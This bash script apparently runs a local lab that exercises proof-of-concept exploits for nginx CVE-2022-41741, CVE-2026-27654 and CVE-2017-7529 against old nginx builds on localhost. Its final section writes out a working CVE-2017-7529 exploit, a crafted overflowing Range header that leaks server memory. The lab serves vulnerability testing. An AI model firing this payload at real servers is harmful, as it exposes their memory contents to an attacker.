#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
stop(){ pkill -f "$LAB/nginx-" 2>/dev/null||true; pkill -f backend-7529.py 2>/dev/null||true; sleep 1; }

echo "===41741 with start=0==="
stop
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" --oversize 8192 --write "$LAB/www/evil2.mp4"
"$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" "http://127.0.0.1:41741/evil2.mp4?start=0"
E41741=$?
echo "41741=$E41741"
tail -8 "$LAB/41741-error.log" 2>/dev/null
stop

echo "===27654 user ns==="
mkdir -p "$LAB/datafiles"
cat >"$LAB/run27654_inner.sh" <<'IN'
#!/usr/bin/env bash
set -e
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
mkdir -p /data/files
mount --bind "$LAB/datafiles" /data/files
"$LAB/nginx-1.29.6/sbin/nginx" -c "$LAB/conf/27654.conf"
python3 "$POCLAB/pocs/CVE-2026-27654/poc.py" "http://127.0.0.1:27654"
IN
chmod +x "$LAB/run27654_inner.sh"
if unshare -Ur -m "$LAB/run27654_inner.sh"; then E27654=0; else E27654=1; fi
echo "27654=$E27654"
tail -10 "$LAB/27654-error.log" 2>/dev/null
stop

echo "===7529 hex dump==="
stop
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s http://127.0.0.1:17529/ >/dev/null
python3 <<'PY'
import requests
url="http://127.0.0.1:17529/"
h={"User-Agent":"PoCLab/CVE-2017-7529"}
b=requests.get(url,headers=h).content
n=len(b)+605
h["Range"]="bytes=-%d,-%d"%(n,0x8000000000000000-n)
r=requests.get(url,headers=h)
print("status",r.status_code,"len",len(r.content))
print(r.content[:120])
PY
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "7529=$?"
stop
